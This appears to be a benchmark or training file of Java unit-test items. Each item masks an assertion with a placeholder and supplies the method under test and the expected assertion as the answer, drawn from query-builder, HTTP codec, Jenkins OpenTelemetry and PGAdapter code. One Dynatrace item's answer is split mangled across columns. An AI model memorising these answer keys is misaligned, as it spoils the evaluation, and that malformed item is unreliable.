build() { _checkSingleUse();  return new NeuralQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder_both() { NeuralQuery origin = new NeuralQuery.Builder().field(""field"") .queryText(""queryText"") .queryImage(""queryImage"") .k(1) .filter(IdsQuery.of(builder -> builder.values(""Some_ID"")).toQuery()) .build(); NeuralQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new NeuralQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { ParentIdQuery origin = new ParentIdQuery.Builder().id(""id"").build(); ParentIdQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new ParentIdQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { PercolateQuery origin = new PercolateQuery.Builder().id(""id"").field(""field"").build(); PercolateQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new PercolateQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { PinnedDoc origin = new PinnedDoc.Builder().index(""index"").id(""id"").build(); PinnedDoc copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new PinnedDoc(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { PrefixQuery origin = new PrefixQuery.Builder().field(""field"").value(""value"").build(); PrefixQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new PrefixQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { QueryStringQuery origin = new QueryStringQuery.Builder().query(""query"").build(); QueryStringQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new QueryStringQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { RandomScoreFunction origin = new RandomScoreFunction.Builder().seed(""seed"").build(); RandomScoreFunction copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new RandomScoreFunction(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { RangeQuery origin = new RangeQuery.Builder().field(""field"").build(); RangeQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new RangeQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { RankFeatureFunctionLogarithm origin = new RankFeatureFunctionLogarithm.Builder().scalingFactor(1.0f).build(); RankFeatureFunctionLogarithm copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new RankFeatureFunctionLogarithm(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { RankFeatureFunctionSaturation origin = new RankFeatureFunctionSaturation.Builder().pivot(1.0f).build(); RankFeatureFunctionSaturation copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new RankFeatureFunctionSaturation(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { RankFeatureFunctionSigmoid origin = new RankFeatureFunctionSigmoid.Builder().exponent(1.0f).pivot(1.0f).build(); RankFeatureFunctionSigmoid copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new RankFeatureFunctionSigmoid(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { RankFeatureQuery origin = new RankFeatureQuery.Builder().field(""field"").build(); RankFeatureQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new RankFeatureQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { RegexpQuery origin = new RegexpQuery.Builder().field(""field"").value(""value"").build(); RegexpQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new RegexpQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { ScriptQuery origin = new ScriptQuery.Builder().script( new Script.Builder().inline(new InlineScript.Builder().source(""source"").build()).build() ).build(); ScriptQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new ScriptQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { ScriptScoreFunction origin = new ScriptScoreFunction.Builder().script( new Script.Builder().inline(new InlineScript.Builder().source(""source"").build()).build() ).build(); ScriptScoreFunction copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new ScriptScoreFunction(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { ScriptScoreQuery origin = new ScriptScoreQuery.Builder().query(buildDummyQuery()) .script(new Script.Builder().inline(new InlineScript.Builder().source(""source"").build()).build()) .build(); ScriptScoreQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new ScriptScoreQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SimpleQueryStringQuery origin = new SimpleQueryStringQuery.Builder().query(""query"").build(); SimpleQueryStringQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SimpleQueryStringQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanContainingQuery origin = new SpanContainingQuery.Builder().big( new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build() ).little(new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build()).build(); SpanContainingQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanContainingQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanFieldMaskingQuery origin = new SpanFieldMaskingQuery.Builder().field(""field"") .query(new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build()) .build(); SpanFieldMaskingQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanFieldMaskingQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanFirstQuery origin = new SpanFirstQuery.Builder().end(1) .match(new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build()) .build(); SpanFirstQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanFirstQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanGapQuery origin = new SpanGapQuery.Builder().field(""field"").spanWidth(1).build(); SpanGapQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new SpanGapQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanMultiTermQuery origin = new SpanMultiTermQuery.Builder().match(buildDummyQuery()).build(); SpanMultiTermQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanMultiTermQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanNearQuery origin = new SpanNearQuery.Builder().clauses( Collections.singletonList( new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build() ) ).build(); SpanNearQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanNearQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanNotQuery origin = new SpanNotQuery.Builder().include( new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build() ).exclude(new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build()).build(); SpanNotQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanNotQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanOrQuery origin = new SpanOrQuery.Builder().clauses( Collections.singletonList( new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build() ) ).build(); SpanOrQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanOrQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanQuery origin = new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build(); SpanQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new SpanQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanTermQuery origin = new SpanTermQuery.Builder().field(""field"").value(""value"").build(); SpanTermQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanTermQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { SpanWithinQuery origin = new SpanWithinQuery.Builder().big( new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build() ).little(new SpanQuery.Builder().spanOr(new SpanOrQuery.Builder().clauses(Collections.emptyList()).build()).build()).build(); SpanWithinQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new SpanWithinQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { TermQuery origin = new TermQuery.Builder().field(""field"").value(FieldValue.of(""1"")).build(); TermQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new TermQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { TermsLookup origin = new TermsLookup.Builder().id(""id"").index(""index"").path(""path"").build(); TermsLookup copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new TermsLookup(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { TermsQueryField origin = new TermsQueryField.Builder().value(Collections.singletonList(FieldValue.of(""1""))).build(); TermsQueryField copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse(); return new TermsQueryField(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { TermsSetQuery origin = new TermsSetQuery.Builder().field(""field"").terms(""terms"").build(); TermsSetQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new TermsSetQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { TypeQuery origin = new TypeQuery.Builder().value(""value"").build(); TypeQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new TypeQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { WildcardQuery origin = new WildcardQuery.Builder().field(""field"").value(""value"").build(); WildcardQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new WildcardQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { WrapperQuery origin = new WrapperQuery.Builder().query(""query"").build(); WrapperQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new WrapperQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { XyShapeFieldQuery origin = new XyShapeFieldQuery.Builder().build(); XyShapeFieldQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new XyShapeFieldQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"toBuilder() { XyShapeQuery origin = new XyShapeQuery.Builder().field(""field"") .xyShape(new XyShapeFieldQuery.Builder().xyShape(JsonData.of(""{}"")).build()) .build(); XyShapeQuery copied = origin.toBuilder().build();  ""<AssertPlaceHolder>""; }
build() { _checkSingleUse();  return new XyShapeQuery(this); }"	assertEquals(toJson(copied), toJson(origin))
"IOException { final ResponseException response = this.buildResponseException(HttpStatus.SC_BAD_REQUEST); ""<AssertPlaceHolder>""; }
status() { return this.response.getStatusLine().getStatusCode(); }"	assertThat(response.status(), equalTo(HttpStatus.SC_BAD_REQUEST))
"IOException { consumer.consume((ByteBuffer) randomByteBufferOfLength(1000).flip()); ""<AssertPlaceHolder>""; }
getBuffer() { return bufferRef.get(); }"	assertThat(consumer.getBuffer().capacity(), equalTo(1000))
"IOException { consumer.consume((ByteBuffer) ByteBuffer.allocate(0).flip()); ""<AssertPlaceHolder>""; }
getBuffer() { return bufferRef.get(); }"	assertThat(consumer.getBuffer().capacity(), equalTo(0))
"IOException { consumer.consume((ByteBuffer) randomByteBufferOfLength(1000).flip()); consumer.consume((ByteBuffer) randomByteBufferOfLength(2000).flip()); consumer.consume((ByteBuffer) randomByteBufferOfLength(3000).flip()); ""<AssertPlaceHolder>""; }
getBuffer() { return bufferRef.get(); }"	assertThat(consumer.getBuffer().capacity(), equalTo(6000))
"IOException { consumer.consume((ByteBuffer) randomByteBufferOfLength(BUFFER_LIMIT).flip()); ""<AssertPlaceHolder>""; }
getBuffer() { return bufferRef.get(); }"	assertThat(consumer.getBuffer().capacity(), equalTo(BUFFER_LIMIT))
"test_RFC3986_UNRESERVED_encoding() { ""<AssertPlaceHolder>""; }
encode(final CharSequence content) { if (content == null) { return null; } final StringBuilder buf = new StringBuilder(); encode(buf, content, StandardCharsets.UTF_8, unreserved, false); return buf.toString(); }"	assertEquals(this.encodedRFC3986Unreserved, PercentCodec.RFC3986_UNRESERVED.encode(this.decoded))
"test_RFC3986_UNRESERVED_decoding() { ""<AssertPlaceHolder>""; }
decode(final CharSequence content) { return decode(content, StandardCharsets.UTF_8, false); }"	assertEquals(this.decoded, PercentCodec.RFC3986_UNRESERVED.decode(this.encodedRFC3986Unreserved))
"test_RFC3986_PATH_encoding() { ""<AssertPlaceHolder>""; }
encode(final CharSequence content) { if (content == null) { return null; } final StringBuilder buf = new StringBuilder(); encode(buf, content, StandardCharsets.UTF_8, unreserved, false); return buf.toString(); }"	assertEquals(this.encodedRFC3986Path, PercentCodec.RFC3986_PATH.encode(this.decoded))
"test_RFC3986_PATH_decoding() { ""<AssertPlaceHolder>""; }
decode(final CharSequence content) { return decode(content, StandardCharsets.UTF_8, false); }"	assertEquals(this.decoded, PercentCodec.RFC3986_PATH.decode(this.encodedRFC3986Path))
"IOException { LogsViewHeader logsViewHeader = new LogsViewHeader( ""My Logs Capable Observability Backend"", ""https://observability.example.com/traceId=123456789"", ""/plugin/opentelemetry/images/svgs/opentelemetry.svg""); StringWriter actualStringWriter = new StringWriter(); logsViewHeader.writeHeader(actualStringWriter, null,StandardCharsets.UTF_8); System.out.println(actualStringWriter); String expected = ""<img src='/plugin/opentelemetry/images/svgs/opentelemetry.svg' /> View logs in <a href='https://observability.example.com/traceId=123456789' target='_blank'>My Logs Capable Observability Backend</a>"" + ""\n""; Assert.""<AssertPlaceHolder>""; }
writeHeader(Writer w, FlowExecutionOwner.Executable context, Charset charset) throws IOException { ConsoleAnnotator consoleAnnotator = new ConsoleAnnotator() { @Override public ConsoleAnnotator annotate(@NonNull Object context, @NonNull MarkupText text) { StaplerRequest currentRequest = Stapler.getCurrentRequest(); String iconRootContextRelativeUrl; if (currentRequest == null) { // unit test iconRootContextRelativeUrl = backendIconUrl; } else { iconRootContextRelativeUrl = currentRequest.getContextPath() + backendIconUrl; }  text.addMarkup(0, 0, ""<img src='"" + iconRootContextRelativeUrl + ""' />"", """"); text.addMarkup(messageFirstToken.length(), messageFirstToken.length() + backendName.length(), ""<a href='"" + backendUrl + ""' target='_blank'>"", ""</a>""); return this; } }; ConsoleAnnotationOutputStream<FlowExecutionOwner.Executable> caw = new ConsoleAnnotationOutputStream<>(w, consoleAnnotator, context, charset); try(CountingOutputStream cos = new CountingOutputStream(caw)){ cos.write((getMessage() + ""\n"").getBytes(StandardCharsets.UTF_8)); cos.flush(); return cos.getByteCount(); } }"	assertEquals(expected, actualStringWriter.toString())
"ClassNotFoundException { String template = ""https://observability.Example.com/dashboards/jenkins?service.name=${resource['service.name']}"";  Map<String, String> resourceAttributesAsMap = Collections.singletonMap(""service.name"", ""jenkins""); Map<String, Object> binding = Collections.singletonMap(""resource"", resourceAttributesAsMap);  String actual = new GStringTemplateEngine().createTemplate(template).make(binding).toString(); MatcherAssert.""<AssertPlaceHolder>""; }
toString() { return ""CustomBackend{"" + ""traceVisualisationUrlTemplate='"" + traceVisualisationUrlTemplate + ''' + "", metricsVisualizationUrl='"" + metricsVisualizationUrlTemplate + ''' + '}'; }"	"assertThat(actual, CoreMatchers.is(""https://observability.Example.com/dashboards/jenkins?service.name=jenkins""))"
"testGetMetricsVisualizationUrlDashboardIsSet() { DynatraceBackend backend = new DynatraceBackend(""https://{your-environment-id}.live.dynatrace.com/""); backend.setDashboardId(""311fa105-1f09-4005-926d-8d27bc33a717""); Resource resource = Resource.builder().put(ServiceAttributes.SERVICE_NAME, ""jenkins"").build();   String actual = backend.getMetricsVisualizationUrl(resource); ""<AssertPlaceHolder>"";id=311fa105-1f09-4005-926d-8d27bc33a717;gf=all;gtf=today"")); }
setDashboardId(String dashboardId) { this.dashboardId = dashboardId; }"	"assertThat(actual, is(""https://{your-environment-id}.live.dynatrace.com/#dashboard"
"testNoElasticLogsBackend() { ElasticBackend elasticBackend = new ElasticBackend(); elasticBackend.setElasticLogsBackend(new NoElasticLogsBackend()); Map<String, String> actual = elasticBackend.getOtelConfigurationProperties(); Map<String, String> expected = Collections.emptyMap(); Assert.""<AssertPlaceHolder>""; }
getOtelConfigurationProperties() { // FIXME related to https://github.com/jenkinsci/opentelemetry-plugin/issues/683 if (elasticLogsBackend == null) { return Collections.emptyMap(); } else { return elasticLogsBackend.getOtelConfigurationProperties(); } }"	assertEquals(actual, expected)
"testElasticLogsBackendWithJenkinsVisualization() { ElasticBackend elasticBackend = new ElasticBackend(); elasticBackend.setElasticLogsBackend(new ElasticLogsBackendWithJenkinsVisualization()); Map<String, String> actual = elasticBackend.getOtelConfigurationProperties(); Map<String, String> expected = Collections.singletonMap(""otel.logs.exporter"", ""otlp""); Assert.""<AssertPlaceHolder>""; }
getOtelConfigurationProperties() { // FIXME related to https://github.com/jenkinsci/opentelemetry-plugin/issues/683 if (elasticLogsBackend == null) { return Collections.emptyMap(); } else { return elasticLogsBackend.getOtelConfigurationProperties(); } }"	assertEquals(actual, expected)
"testElasticLogsBackendWithoutJenkinsVisualization() { ElasticBackend elasticBackend = new ElasticBackend(); elasticBackend.setElasticLogsBackend(new ElasticLogsBackendWithoutJenkinsVisualization()); Map<String, String> actual = elasticBackend.getOtelConfigurationProperties(); Map<String, String> expected = Collections.singletonMap(""otel.logs.exporter"", ""otlp""); Assert.""<AssertPlaceHolder>""; }
getOtelConfigurationProperties() { // FIXME related to https://github.com/jenkinsci/opentelemetry-plugin/issues/683 if (elasticLogsBackend == null) { return Collections.emptyMap(); } else { return elasticLogsBackend.getOtelConfigurationProperties(); } }"	assertEquals(actual, expected)
"IOException { LOG.info(""Running download test""); // Results are in the order of: FileMeta, ...<each-file-part>, <download-task-status>. List<Result> streamedResults = new ArrayList<>(); final CountDownLatch latch = new CountDownLatch(1); StreamObserver<Result> responseObserver = new StreamObserver<Result>() { @Override public void onNext(Result result) { streamedResults.add(result); }  @Override public void onError(Throwable t) { fail(); }  @Override public void onCompleted() { latch.countDown(); } }; // Build the file that requires downloading. FileMetaData executionResultFileMeta = FileMetaData.newBuilder() .setName(""out"") .setType(""txt"") .setTaskId(TASK_ID) .build(); WorkerGrpc.WorkerStub worker = WorkerGrpc.newStub(inProcessChannel);  // Download the file. worker.download(executionResultFileMeta, responseObserver);  // Wait until streaming is done. Here the total time is assumed one second. ""<AssertPlaceHolder>"";  // Assert. compareAndAssertReceivedFile(streamedResults, executionResultFileMeta); }
download(FileMetaData request, StreamObserver<Result> responseObserver) { try { // Send file metadata as the first element in the stream. responseObserver.onNext(Result.newBuilder().setOutputFileMetaData(request).build()); // Obtain input source for the file. InputStream fileInputStream = WorkerUtils.getTaskExecutionManager().get(request).getValue(); // Stream input source over the gRPC connection. streamInChunks(responseObserver, fileInputStream); // Set the result as the last element, and conclude streaming. handleResponse(responseObserver, Status.SUCCESS, null); } catch (Throwable t) { LOG.error(""Failed getting the file"", t); handleResponse(responseObserver, Status.FAILED, t); } }"	assertTrue(latch.await(1, TimeUnit.SECONDS))
"Exception { ProxyServer server = mock(ProxyServer.class); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); DataOutputStream dataOutputStream = new DataOutputStream(new ByteArrayOutputStream()); ConnectionMetadata connectionMetadata = mock(ConnectionMetadata.class); when(connectionMetadata.getOutputStream()).thenReturn(dataOutputStream); WireMessage message = mock(WireMessage.class); when(server.recordMessage(message)).thenReturn(message); doThrow( SpannerExceptionFactory.newSpannerException( ErrorCode.FAILED_PRECONDITION, ""non-fatal test exception"")) .when(message) .send();  ConnectionHandler connection = new ConnectionHandler(server, socket) { public ConnectionMetadata getConnectionMetadata() { return connectionMetadata; } }; connection.setThread(mock(Thread.class));  connection.setMessageState(message); connection.handleMessages();  ""<AssertPlaceHolder>""; }
getStatus() { return status; }"	assertEquals(ConnectionStatus.UNAUTHENTICATED, connection.getStatus())
"Exception { ProxyServer server = mock(ProxyServer.class); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); DataOutputStream dataOutputStream = new DataOutputStream(new ByteArrayOutputStream()); ConnectionMetadata connectionMetadata = mock(ConnectionMetadata.class); when(connectionMetadata.getOutputStream()).thenReturn(dataOutputStream); WireMessage message = mock(WireMessage.class); when(server.recordMessage(message)).thenReturn(message); doThrow(new EOFException(""fatal test exception"")).when(message).send();  ConnectionHandler connection = new ConnectionHandler(server, socket) { public ConnectionMetadata getConnectionMetadata() { return connectionMetadata; } }; connection.setThread(mock(Thread.class));  connection.setMessageState(message); connection.handleMessages();  ""<AssertPlaceHolder>""; }
getStatus() { return status; }"	assertEquals(ConnectionStatus.TERMINATED, connection.getStatus())
"testRestartConnectionWithSsl_CreatesSslSocket() { ProxyServer server = mock(ProxyServer.class); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); AtomicBoolean calledCreateSSLSocket = new AtomicBoolean(); ConnectionHandler connection = new ConnectionHandler(server, socket) { @Override void createSSLSocket() { calledCreateSSLSocket.set(true); } }; connection.setThread(mock(Thread.class)); connection.restartConnectionWithSsl();  ""<AssertPlaceHolder>""; }
restartConnectionWithSsl() { try { createSSLSocket(); runConnection(true); } catch (IOException ioException) { PGException pgException = PGException.newBuilder( ""Failed to create SSL socket: "" + (ioException.getMessage() == null ? ioException.getClass().getName() : ioException.getMessage())) .setSeverity(Severity.FATAL) .setSQLState(SQLState.InternalError) .build(); try { handleError(pgException); } catch (Exception ignore) { } throw pgException; } }"	assertTrue(calledCreateSSLSocket.get())
"Exception { OptionsMetadata options = mock(OptionsMetadata.class); ProxyServer server = mock(ProxyServer.class); when(server.getOptions()).thenReturn(options); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); ConnectionHandler connectionHandler = new ConnectionHandler(server, socket) { @Override public ConnectionMetadata getConnectionMetadata() { return new ConnectionMetadata(mock(InputStream.class), mock(OutputStream.class)); } };  ""<AssertPlaceHolder>""; }
checkValidConnection(boolean ssl) throws Exception { // Allow SSL connections from non-localhost even if the localhost check has not explicitly // been disabled. if (!ssl && !server.getOptions().disableLocalhostCheck() && !this.socket.getInetAddress().isAnyLocalAddress() && !this.socket.getInetAddress().isLoopbackAddress()) { handleError( PGException.newBuilder(""This proxy may only be accessed from localhost."") .setSeverity(Severity.FATAL) .setSQLState(SQLState.SQLServerRejectedEstablishmentOfSQLConnection) .build()); return false; } if (!ssl && server.getOptions().getSslMode() == SslMode.Require) { handleError( PGException.newBuilder(""This proxy requires SSL."") .setSeverity(Severity.FATAL) .setSQLState(SQLState.SQLServerRejectedEstablishmentOfSQLConnection) .build()); return false; } return true; }"	assertTrue(connectionHandler.checkValidConnection(false))
"Exception { OptionsMetadata options = mock(OptionsMetadata.class); ProxyServer server = mock(ProxyServer.class); when(server.getOptions()).thenReturn(options); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); ConnectionHandler connectionHandler = new ConnectionHandler(server, socket) { @Override public ConnectionMetadata getConnectionMetadata() { return new ConnectionMetadata(mock(InputStream.class), mock(OutputStream.class)); } };  ""<AssertPlaceHolder>""; }
checkValidConnection(boolean ssl) throws Exception { // Allow SSL connections from non-localhost even if the localhost check has not explicitly // been disabled. if (!ssl && !server.getOptions().disableLocalhostCheck() && !this.socket.getInetAddress().isAnyLocalAddress() && !this.socket.getInetAddress().isLoopbackAddress()) { handleError( PGException.newBuilder(""This proxy may only be accessed from localhost."") .setSeverity(Severity.FATAL) .setSQLState(SQLState.SQLServerRejectedEstablishmentOfSQLConnection) .build()); return false; } if (!ssl && server.getOptions().getSslMode() == SslMode.Require) { handleError( PGException.newBuilder(""This proxy requires SSL."") .setSeverity(Severity.FATAL) .setSQLState(SQLState.SQLServerRejectedEstablishmentOfSQLConnection) .build()); return false; } return true; }"	assertTrue(connectionHandler.checkValidConnection(false))
"Exception { OptionsMetadata options = mock(OptionsMetadata.class); when(options.disableLocalhostCheck()).thenReturn(true); ProxyServer server = mock(ProxyServer.class); when(server.getOptions()).thenReturn(options); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); ConnectionHandler connectionHandler = new ConnectionHandler(server, socket);  ""<AssertPlaceHolder>""; }
checkValidConnection(boolean ssl) throws Exception { // Allow SSL connections from non-localhost even if the localhost check has not explicitly // been disabled. if (!ssl && !server.getOptions().disableLocalhostCheck() && !this.socket.getInetAddress().isAnyLocalAddress() && !this.socket.getInetAddress().isLoopbackAddress()) { handleError( PGException.newBuilder(""This proxy may only be accessed from localhost."") .setSeverity(Severity.FATAL) .setSQLState(SQLState.SQLServerRejectedEstablishmentOfSQLConnection) .build()); return false; } if (!ssl && server.getOptions().getSslMode() == SslMode.Require) { handleError( PGException.newBuilder(""This proxy requires SSL."") .setSeverity(Severity.FATAL) .setSQLState(SQLState.SQLServerRejectedEstablishmentOfSQLConnection) .build()); return false; } return true; }"	assertTrue(connectionHandler.checkValidConnection(false))
"testMaybeDetermineWellKnownClient_remainsUnspecifiedForUnknownStatement() { OptionsMetadata options = mock(OptionsMetadata.class); ProxyServer server = mock(ProxyServer.class); when(server.getOptions()).thenReturn(options); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); ConnectionHandler connectionHandler = new ConnectionHandler(server, socket);  when(options.shouldAutoDetectClient()).thenReturn(true); connectionHandler.setWellKnownClient(WellKnownClient.UNSPECIFIED);  connectionHandler.maybeDetermineWellKnownClient(Statement.of(""select 1""));  ""<AssertPlaceHolder>""; }
getWellKnownClient() { return wellKnownClient; }"	assertEquals(WellKnownClient.UNSPECIFIED, connectionHandler.getWellKnownClient())
"testMaybeDetermineWellKnownClient_changesFromUnspecifiedWithKnownStatement() { OptionsMetadata options = mock(OptionsMetadata.class); ProxyServer server = mock(ProxyServer.class); when(server.getOptions()).thenReturn(options); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); ConnectionHandler connectionHandler = new ConnectionHandler(server, socket);  when(options.shouldAutoDetectClient()).thenReturn(true); connectionHandler.setWellKnownClient(WellKnownClient.UNSPECIFIED);  connectionHandler.maybeDetermineWellKnownClient( Statement.of( ""SELECT version();\n"" + ""\n"" + ""SELECT ns.nspname, t.oid, t.typname, t.typtype, t.typnotnull, t.elemtypoid\n""));  ""<AssertPlaceHolder>""; }
getWellKnownClient() { return wellKnownClient; }"	assertEquals(WellKnownClient.NPGSQL, connectionHandler.getWellKnownClient())
"testMaybeDetermineWellKnownClient_respectsAutoDetectClientSetting() { OptionsMetadata options = mock(OptionsMetadata.class); ProxyServer server = mock(ProxyServer.class); when(server.getOptions()).thenReturn(options); Socket socket = mock(Socket.class); when(socket.getInetAddress()).thenReturn(InetAddress.getLoopbackAddress()); ConnectionHandler connectionHandler = new ConnectionHandler(server, socket);  when(options.shouldAutoDetectClient()).thenReturn(false); connectionHandler.setWellKnownClient(WellKnownClient.UNSPECIFIED);  connectionHandler.maybeDetermineWellKnownClient( Statement.of( ""SELECT version();\n"" + ""\n"" + ""SELECT ns.nspname, t.oid, t.typname, t.typtype, t.typnotnull, t.elemtypoid\n""));  ""<AssertPlaceHolder>""; }
getWellKnownClient() { return wellKnownClient; }"	assertEquals(WellKnownClient.UNSPECIFIED, connectionHandler.getWellKnownClient())
"testExtractMetadata() { ByteArrayOutputStream byteArrayStream = new ByteArrayOutputStream(); PrintStream out = new PrintStream(byteArrayStream); String expectedPGAdapterVersion = Server.getVersion(); String expectedPostgreSQLVersion = new OptionsMetadata(new String[] {}).getServerVersion();  Server.extractMetadata(new String[] {}, out);  ""<AssertPlaceHolder>""; }
extractMetadata(String[] args, PrintStream out) { out.printf(""-- Starting PGAdapter version %s --\n"", getVersion()); OptionsMetadata optionsMetadata = new OptionsMetadata(args); out.printf(""-- PostgreSQL version: %s -- \n"", optionsMetadata.getServerVersion()); if (System.getProperty(""javax.net.ssl.keyStore"") != null) { if (!new File(System.getProperty(""javax.net.ssl.keyStore"")).exists()) { throw new IllegalArgumentException( ""Key store "" + System.getProperty(""javax.net.ssl.keyStore"") + "" does not exist""); } }  return optionsMetadata; }"	"assertEquals( ""-- Starting PGAdapter version "" + expectedPGAdapterVersion + "" --\n"" + ""-- PostgreSQL version: "" + expectedPostgreSQLVersion + "" -- \n"", byteArrayStream.toString())"
